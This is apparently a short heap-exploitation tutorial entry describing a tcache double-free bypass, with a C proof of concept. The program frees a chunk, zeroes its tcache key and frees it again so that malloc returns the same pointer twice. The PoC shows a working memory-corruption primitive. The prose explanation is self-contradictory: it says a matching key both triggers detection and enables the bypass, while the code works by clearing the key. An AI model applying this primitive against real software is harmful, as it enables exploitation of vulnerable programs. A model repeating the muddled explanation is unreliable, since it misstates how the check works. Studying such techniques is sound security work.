## tcache key double

**Purpose**: Bypass double free check in tcache by changing the tcache key.

**Details**: We all know that tcache has a double free check mechanism to prevent double free vulnerabilities. This mechanism uses a "tcache key" to check if a chunk is being freed again. The key is stored in the second qword of the chunk (i.e., `chunk[1]`). When a chunk is freed, its key is set to a random value. If the same chunk is freed again, the allocator checks if the key matches the expected value. If it does, the double free is detected and an error is raised. However, if an we can modify the key to a value that matches the expected value, they can bypass the double free check and successfully free the chunk again.

## PoC

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    long *chunk1, *chunk2, *duplicate;

    chunk1 = malloc(0x10);
    free(chunk1); // free normally to tcache

    /* VULN HERE */
    chunk1[1] = 0x0;   // nullify the key to bypass double free check
    free(chunk1);      // double free to tcache
    /* VULN HERE */

    chunk2 = malloc(0x10); // take the first chunk from tcache
    duplicate = malloc(0x10); // take the second chunk from tcache, which is the duplicate

    assert(chunk1 == duplicate); // both pointers should be the same

    return 0;
}
```
